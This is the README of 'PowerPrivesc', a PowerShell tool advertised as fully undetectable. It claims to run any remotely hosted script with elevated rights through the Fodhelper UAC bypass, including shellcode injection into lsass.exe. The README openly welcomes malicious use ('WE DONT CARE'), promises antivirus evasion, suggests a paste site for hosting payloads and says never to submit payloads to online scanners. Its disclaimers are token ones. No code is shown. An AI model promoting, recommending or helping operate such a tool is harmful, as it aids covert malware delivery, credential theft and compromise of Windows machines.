# PowerPrivesc - Your AIO FUD Powershell Privesc Tool
Your all-in-one Powershell privilege escalation tool to run ANY script from a webserver.
You heard it right,ANYTHING! Wether its malicious or not,WE DONT CARE! ;)

The privilige escalation method that this tool used is the same one with the one that used on [MeterPwrShell](https://github.com/GetRektBoy724/MeterPwrShell).
This tool literally can run any script you want,from a normal copy-paste file to injecting shellcode into lsass.exe.
Dont forget to host the script somewhere! (my own recommendation is paste.c-net.org),
And also,dont even worry of your script is getting caught by AVs,we take care of the AV Evasion and Bypass ;)
# Notes
- NEVER UPLOAD THE PAYLOAD THAT GENERATED BY THIS PROGRAM TO ANY ONLINE SCANNER
- NEVER USE THIS PROGRAM FOR MALICIOUS PURPOSE
- SPREADING THE PAYLOAD THAT GENERATED BY THIS PROGRAM IS NOT COOL
- ANY DAMAGE GENERATED BY THIS PROGRAM IS NOT MY (As the program maker) RESPONSIBILTY!!!
- THIS TOOL DOESNT SCAN FOR PRIVESC VULNS,BUT ACTUALLY EXPLOIT A VULNERABILITY THAT WORKS AND UNPATCHED ON ALL WINDOWS 10 (which is Fodhelper Privesc Vulnerability)
- If you have some feature recommendation,post that on Issue
- If you want to know how tf my tool can bypass any AVs,you can check on [this](https://gist.github.com/GetRektBoy724/9383c9580cb1c9935fc04cc7eb7ef004) and [this](https://blog.sevagas.com/Bypass-Antivirus-Dynamic-Analysis)
